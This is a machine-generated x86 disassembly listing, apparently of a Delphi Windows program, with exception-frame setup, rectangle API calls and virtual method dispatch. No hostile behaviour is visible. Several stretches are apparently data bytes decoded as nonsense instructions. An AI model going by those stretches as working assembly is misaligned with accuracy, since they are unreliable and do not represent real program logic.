lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x1
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_42ce6f
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42ce95
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ce9c
retn
sub_42ceb0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42ced5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cedc
retn
sub_42cee8
in al dx
into
inc edx
add [ edi ] cl
or eax 0x6c654849
dec eax
insb
jo r-xdata
insb
arpl [ gs : edi + ebp * 2 + 0x72 ] si
and al 0x11
inc eax
add [ ecx ] al
pop eax
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc ecx [ ecx + 0x45 ]
outsb
je r-xdata
push [ eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42cedc
retn
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
inc edx
outsb
dec eax
insb
adc [ ebx + 0x4fc000b9 ] esp
jae r-xdata
outsd
outsb
je r-xdata
rol [ edx ] 0x1
or al 0x0
add [ eax ] al
test al 0x72
inc eax
add al dh
popad
outsb
popad
jb r-xdata
lodsd [ esi ]
jns r-xdata
imul esp [ ebp + 0x77 ] 0xcf547265
inc edx
add [ ecx ] al
xchg bx ax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add [ edi ] cl
adc [ ecx + 0x43 ] ecx
jne r-xdata
add bh bh
[ eax - 0x31 ]
inc edx
lodsd [ esi ]
imul esp [ ebp + 0x77 ] 0x11247265
inc eax
add [ ecx ] al
xchg ebx eax
cld
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
jae r-xdata
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0xe004032 ] bl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ edi + ecx * 8 + 0x42 ] dl
jns r-xdata
xor al 0x40
add ah bh
xor al 0x40
add [ eax ] al
xor eax 0x35040040
inc eax
add al bh
xor al 0x40
add [ eax + 0x42d0 ] dl
adc [ eax ] eax
add [ esi - 0x6d ] esp
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0042d0 ] dl
add [ eax ] al
outsb
je r-xdata
xchg esp eax
iretd
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
adc [ eax ] eax
add [ ebx + edx * 4 - 0x4 ] esp
rol [ edx ] 0x1
outsb
je r-xdata
adc eax 0x65705349
arpl [ ecx + 0x61 ] bp
insb
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
je r-xdata
jns r-xdata
add [ edi ] cl
outsb
je r-xdata
dec [ ebx + 0x42cf24c0 ]
add [ edi ] cl
or ecx [ ecx + 0x48 ]
insb
jo r-xdata
add bh bh
xor [ edx ] ecx
add [ eax ] al
add eax 0xffffffd4
jmp r-xdata
imul esp [ ebp + 0x77 ] 0x6f4e7265
mov eax eax
push esi
je r-xdata
insb
jo r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add [ eax - 0xfffbf8e ] ch
jae r-xdata
jns r-xdata
add al al
dec edi
jae r-xdata
jb r-xdata
cmp cl [ ecx ]
dec eax
insd
dec eax
insb
jo r-xdata
jo r-xdata
insb
je r-xdata
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
jae r-xdata
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42dc7b
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
add [ eax + eax ] al
inc edx
insd
inc ebp
js r-xdata
dec ecx
imul esp [ ebp + 0x77 ] 0xcf907265
inc edx
add [ ecx ] al
xchg bx ax
cld
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax + 0x14004032 ] bl
inc ebp
dec eax
insb
jo r-xdata
inc eax
outsb
je r-xdata
add [ edi ] cl
or al 0x49
dec eax
insb
jo r-xdata
add bh bh
dec [ ebx + 0x42d010c0 ]
iretd
add bh bh
call eax
insb
jo r-xdata
iretd
insd
and al 0x11
inc eax
add [ ecx ] al
push ebx
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
js r-xdata
movlps [ ecx + 0x45 ] xmm1
add bh bh
dec [ ebx + 0x42cf94c0 ]
add [ edi ] cl
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_40408c
add [ eax ] al
andps xmm1 [ eax + 0x65 ]
insb
jo r-xdata
add al 0x0
jo r-xdata
imul ebp [ edi + 0x6e ] 0xf400408d
rol [ edx ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
jae r-xdata
jo r-xdata
cmp cl [ ecx ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba8c
call sub_403a74
jmp r-xdata
int3
mov eax eax
lea eax [ eax ]
nop
rol [ edx ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
add [ eax ] al
add bh bh
dec [ ebp - 0x2f6fffc0 ]
inc edx
add [ eax ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42dc82
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404aec
lea eax [ ebp - 0x8 ]
call sub_405934
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405978
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_42c114
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_40594c
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405978
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_42d19f
xor ecx edx
inc edx
add [ ebx ] bh
rol [ edx ] 0x1
inc ebp
rol [ edx ] 0x1
sbb ecx edx
inc edx
add [ ecx ] ah
rol [ edx ] 0x1
sub ecx edx
inc edx
add [ edi - 0x2f ] bh
add [ ecx ] bl
rol [ edx ] 0x1
and ecx edx
inc edx
add [ ecx ] ch
rol [ edx ] 0x1
inc edx
add [ edx ] al
add [ eax ] al
add [ esi - 0x6d ] ah
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
inc esp
and al 0x4
aam 0xe9
jne r-xdata
inc edx
add [ ecx - 0x6cffbd2f ] cl
rol [ edx ] 0x1
dec edi
rol [ edx ] 0x1
push edi
rol [ edx ] 0x1
pop edi
rol [ edx ] 0x1
rol [ bp + si ] 0x1
outsd
rol [ edx ] 0x1
ja r-xdata
std
dec esp
int3
cmp bl [ edi + 0x280042d1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx - 0x6d ] dl
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
add eax 0xffffffd8
jmp sub_42dda0
std
inc [ ebx - 0x2bfbdbbc ]
jmp sub_405a1c
jg r-xdata
cmp dh [ edi + 0x2c0042d1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + r-xdata ] dl
xor [ ecx + ecx * 4 + 0x20 ] ah
popad
outsb
popad
jb r-xdata
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ rw-data ]
call sub_42d438
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40594c
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d329
lea eax [ ebp - 0x8 ]
call sub_405934
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42d3c4
mov [ rw-data ] eax
fcmovnbe st1
inc edx
add [ eax ] al
add [ eax ] al
add [ edx + edx * 8 + 0x42 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi - 0x2e ] bh
inc edx
add [ eax ] dh
add [ eax ] al
add [ ecx + edx + 0x34f00040 ] ah
inc eax
add [ ecx + ebx * 2 + 0x59c00040 ] dh
inc eax
add [ esi + 0x34f80040 ] al
inc eax
add al dl
pop ecx
inc eax
add [ edx + esi + 0x40 ] bl
add [ esi + ebx * 8 + 0x42 ] al
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add al ch
into
inc edx
add [ eax + eax ] cl
add [ eax ] al
xchg esp eax
adc [ eax ] al
and al 0x0
add [ eax ] al
or al 0x54
dec eax
insb
jo r-xdata
push esi
dec ecx
add [ edx ] bl
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add [ ebx ] bl
inc [ eax ]
add [ esi + edx * 2 + 0x49 ] ah
add [ edi + edi * 8 ] bl
add [ eax ] al
push esi
dec ecx
add [ 0x550000ff ] bl
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
push ebp
push sub_42d322
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov [ eax ] edx
sub_42d2ac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_42d322
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
mov [ eax ] edx
lea ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ rw-data ]
call sub_42d438
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40594c
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d329
lea eax [ ebp - 0x8 ]
call sub_405934
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42d3c4
mov [ rw-data ] eax
sub_42d330
push ebp
mov ebp esp
push ebx
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov [ ebx ] eax
mov eax ebx
mov edx [ rw-data ]
test edx edx
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42d3c4
mov [ rw-data ] eax
mov ecx r-xdata
call sub_405978
xor eax eax
pop ebx
pop ebp
retn
sub edx 0xfffffff8
sub_42d388
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_40594c
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_42d3c4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403278
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c080
mov [ esi + 0x10 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c080
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c080
mov [ esi + 0x18 ] eax
lea eax [ esi + 0x24 ]
call sub_404038
mov [ esi + 0x1c ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_42d438
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_42d539
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_42d388
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x10 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_42c130
mov edx [ esi + 0x8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x24 ]
lea eax [ ebp - 0x8 ]
call sub_405934
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40d500
test al al
je r-xdata
lea eax [ ebp - 0xc ]
call sub_405934
mov ecx eax
mov edx r-xdata
mov eax edi
call sub_40d500
test al al
je r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42d388
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x14 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_42c130
inc [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx ebx
test edx edx
je r-xdata
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42d388
mov esi eax
mov eax [ ebx + 0x1c ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0x18 ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_42c130
mov ecx r-xdata
call sub_405978
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d540
lea eax [ ebp - 0xc ]
call sub_405934
lea eax [ ebp - 0x8 ]
call sub_405934
retn
sub edx 0xfffffff8
sub_42d558
push ebx
push esi
push edi
mov ebx eax
jmp r-xdata
mov esi [ ebx + 0x10 ]
mov edi [ esi + 0x8 ]
test edi edi
jg r-xdata
mov edx edi
dec edx
mov eax esi
call sub_42c114
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebx + 0x18 ]
mov edx [ eax ]
call [ edx + 0x8 ]
pop edi
pop esi
pop ebx
retn
sub_42d598
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ edi + 0x10 ]
mov edx esi
call sub_42c114
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x28 ]
inc esi
dec ebx
jne r-xdata
sub_42d5c8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42d75a
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x1
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax esi
xor edx edx
call sub_42c114
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x0
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42d6f5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d761
lea eax [ ebp - 0x10 ]
call sub_404038
retn
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_42c114
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba8c
call sub_403a74
mov eax esi
xor edx edx
call sub_42c114
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
jle r-xdata
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_42c114
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x10 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4032a8
retn
mov eax [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_42c114
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
sub_42d768
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_42d84d
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test esi esi
je r-xdata
mov eax [ edi + 0x18 ]
mov eax [ eax + 0x8 ]
test eax eax
jle r-xdata
lea eax [ edi + 0x24 ]
mov edx esi
call sub_40408c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d854
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404aec
lea eax [ ebp - 0x8 ]
call sub_405934
retn
dec eax
jne r-xdata
xor edx edx
mov eax [ edi + 0x18 ]
call sub_42c114
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_40594c
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405978
mov eax [ ebp - 0x10 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
xor edx edx
mov eax [ edi + 0x18 ]
call sub_42c114
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_40594c
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405978
mov eax [ ebp - 0xc ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
jmp r-xdata
sub_42d870
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x20 ] ebx
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42da75
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x10 ] eax
xor edi edi
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x8 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x24
mov edx ebx
call sub_40408c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42da7c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
test edi edi
jne r-xdata
inc ebx
xor esi esi
cmp edi 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_4044f8
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] 0x6
lea eax [ ebp - 0x2c ]
push eax
push 0x0
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac8
call sub_403a74
inc esi
dec ebx
jne r-xdata
mov [ ebp - 0x10 ] esi
inc edi
dec edi
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x10 ]
call sub_42c114
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx esi
call sub_42c114
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test eax eax
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
inc ebx
xor esi esi
xor edx edx
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
lea ecx [ ebp - 0x20 ]
xor edx edx
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ esi + 0x4 ]
mov edx [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov ebx eax
test ebx ebx
jl r-xdata
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x14 ]
call sub_4032a8
mov edx ebx
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
lea ecx [ ebp - 0x20 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ esi + 0x4 ]
mov edx [ ebp - 0x20 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx esi
call sub_42c114
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x18 ]
call sub_4032a8
inc eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0xc ] 0x0
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x18 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x30 ]
mov ecx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0x3c ]
inc [ ebp - 0xc ]
dec [ ebp - 0x24 ]
jne r-xdata
sub_42da84
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42db77
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx [ ebp - 0x8 ]
call sub_40408c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba8c
call sub_403a74
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42db7e
lea eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404aec
lea eax [ ebp - 0x10 ]
call sub_405934
retn
inc ebx
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec ebx
jne r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_405978
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ esi + 0x14 ]
call sub_42c114
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x10 ]
call sub_40594c
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_405978
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x38 ]
test al al
je r-xdata
sub_42db9c
inc ebx
mov eax eax
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42dc7b
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_40408c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba8c
call sub_403a74
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42dc82
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404aec
lea eax [ ebp - 0x8 ]
call sub_405934
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405978
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_42c114
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_40594c
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405978
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_42dc9c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4059a8
xor eax eax
push ebp
push sub_42dceb
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc ] 0x0
je r-xdata
